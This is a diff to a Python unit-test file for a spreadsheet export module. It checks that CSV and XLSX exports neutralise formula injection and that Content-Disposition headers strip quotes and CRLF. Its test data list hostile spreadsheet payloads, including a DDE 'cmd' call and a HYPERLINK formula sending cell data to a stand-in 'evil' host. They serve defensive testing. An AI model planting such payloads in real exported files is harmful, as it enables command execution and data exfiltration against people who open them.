@@ -7,8 +7,7 @@ import unittest
 
 from openpyxl import load_workbook
 
-from api.export import attachment_disposition, csv_bytes, xlsx_bytes
-
+# api.export 相关导入全部惰性化，保持无 fastapi 的最小环境可收集测试
 COLS = [("名称", lambda r: r["name"])]
 PAYLOADS = ["=cmd|'/c calc'!A1", "+HYPERLINK(\"http://evil/?\"&A1,\"x\")", "-2+cmd()", "@SUM(A1:A9)",
             "\tabc", "\rcrlf"]
@@ -16,6 +15,7 @@ PAYLOADS = ["=cmd|'/c calc'!A1", "+HYPERLINK(\"http://evil/?\"&A1,\"x\")", "-2+c
 
 class FormulaInjectionTests(unittest.TestCase):
     def test_csv_neutralizes_formula_cells(self) -> None:
+        from api.export import csv_bytes
         for payload in PAYLOADS:
             with self.subTest(payload=payload[:12]):
                 text = csv_bytes([{"name": payload}], COLS).decode("utf-8-sig")
@@ -23,6 +23,7 @@ class FormulaInjectionTests(unittest.TestCase):
                     self.assertFalse(line[:1] in ("=", "+", "-", "@", "\t"), f"CSV 行仍以公式字符开头: {line!r}")
 
     def test_xlsx_neutralizes_formula_cells(self) -> None:
+        from api.export import xlsx_bytes
         for payload in PAYLOADS:
             with self.subTest(payload=payload[:12]):
                 workbook = load_workbook(io.BytesIO(xlsx_bytes([{"name": payload}], COLS)))
@@ -33,6 +34,7 @@ class FormulaInjectionTests(unittest.TestCase):
     def test_normal_values_untouched(self) -> None:
         from datetime import date
         from decimal import Decimal
+        from api.export import csv_bytes
         text = csv_bytes([{"name": "普通中文名"}, {"name": "x=y 不在开头"}, {"name": Decimal("12.30")}, {"name": date(2026, 1, 2)}], COLS).decode("utf-8-sig")
         self.assertIn("普通中文名", text)
         self.assertIn("x=y 不在开头", text)
@@ -42,12 +44,14 @@ class FormulaInjectionTests(unittest.TestCase):
 
 class DispositionTests(unittest.TestCase):
     def test_ascii_name_and_rfc5987(self) -> None:
+        from api.export import attachment_disposition
         header = attachment_disposition("合同扫描件.txt")
         self.assertIn("filename*=UTF-8''", header)
         self.assertIn("%E5%90%88%E5%90%8C", header)  # 「合同」的百分号编码
         header.encode("latin-1")  # 必须可 latin-1 编码（响应头约束）
 
     def test_quotes_and_crlf_stripped_from_ascii_fallback(self) -> None:
+        from api.export import attachment_disposition
         header = attachment_disposition('bad"\r\nname.bin')
         header.encode("latin-1")
         ascii_part = header.split(";")[1].strip()
